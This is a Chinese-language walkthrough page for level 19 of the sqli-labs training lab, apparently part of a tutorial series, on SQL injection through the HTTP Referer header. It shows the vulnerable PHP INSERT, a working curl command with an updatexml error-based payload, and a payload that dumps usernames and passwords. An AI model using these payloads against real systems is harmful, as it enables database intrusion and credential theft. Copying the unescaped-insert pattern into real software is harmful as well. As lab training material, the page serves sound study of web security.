# Less-19

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | 请求头注入 · Referer |
| **闭合方式** | `'` |
| **成败信号** | flag.jpg + XPATH 报错 |
| **一句话** | Referer 写库 |
| **核心 payload** | `Referer: ' or updatexml(1,concat(0x7e,database()),1) or '` |

---

**请求头注入 · Referer**

### 源码

```php
$uagent = $_SERVER['HTTP_REFERER'];           // ← 注入点换成了 Referer

$insert = "INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
mysql_query($insert);
```

跟 Less-18 完全同构，只是把注入点从 `User-Agent` 换成了 `Referer`，写入的表也从 `uagents` 换成 `referers`。

### 通关 payload（实测）

```bash
curl -s -X POST "http://localhost/sqli-labs-master/Less-19/" \
     -d "uname=admin&passwd=admin&submit=submit" \
     -H "Referer: ' or updatexml(1,concat(0x7e,database()),1) or '"
```

**实测结果**：`flag.jpg` + `XPATH syntax error: '~security'` ✓

制造语法错误验证：
```
Referer: http://x'
→  near '127.0.0.1')' at line 1
```

拖库：
```
Referer: ' or updatexml(1,concat(0x7e,(select * from (select group_concat(username,0x3a,password) from users) x)),1) or '
```

> 💡 **为什么这两关的闭合是 `' or ... or '` 而不是 `' --+`？**
> 因为 `INSERT` 是**单行语句**，后面没有 `LIMIT 0,1` 可以注释掉，而且 VALUES 的括号必须配平。
> 所以要用 `or '...'` 把尾部那个引号「借」回来，让语法重新合法。

---

[← Less-18](Less-18.md) ｜ [返回目录](README.md) ｜ [Less-20 →](Less-20.md)